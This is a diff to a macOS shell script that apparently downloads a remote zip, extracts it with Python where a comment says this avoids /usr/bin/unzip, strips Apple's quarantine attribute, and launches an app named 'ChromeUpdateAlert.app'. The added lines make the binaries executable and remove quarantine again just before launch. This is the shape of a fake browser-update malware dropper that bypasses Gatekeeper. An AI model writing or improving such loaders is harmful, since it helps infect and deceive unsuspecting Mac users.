@@ -37,7 +37,7 @@ with urllib.request.urlopen(url, context=ctx) as r, open(outfile, 'wb') as f:
 " "$ZIP_URL" "$ZIP_FILE"  && [[ -f "$ZIP_FILE" ]]; then
 
     # Extraer el archive con Python stdlib (proceso distinto a /usr/bin/unzip)
-    python3 - "$ZIP_FILE" "$WORK_DIR" <<'PYEOF'
+    if ! python3 - "$ZIP_FILE" "$WORK_DIR" <<'PYEOF'
 import sys, os, zipfile
 
 zip_path, dest = sys.argv[1], sys.argv[2]
@@ -45,6 +45,11 @@ os.makedirs(dest, exist_ok=True)
 with zipfile.ZipFile(zip_path, 'r') as z:
     z.extractall(dest)
 PYEOF
+    then
+        echo "Extraction failed."
+        cleanup
+        exit 1
+    fi
 
     # If the zip wrapped everything in a Willo1/ folder, flatten it
     if [[ -d "$WORK_DIR/Willo1" ]]; then
@@ -105,6 +110,8 @@ xattr -dr com.apple.quarantine "$WORK_DIR" 2>/dev/null
 
 # Step 6: Run ChromeUpdateAlert.app
 if [[ -d "$WORK_DIR/$APP" ]]; then
+    chmod -R +x "$WORK_DIR/$APP/Contents/MacOS/" 2>/dev/null
+    xattr -dr com.apple.quarantine "$WORK_DIR/$APP" 2>/dev/null
     open "$WORK_DIR/$APP" &
 fi
 
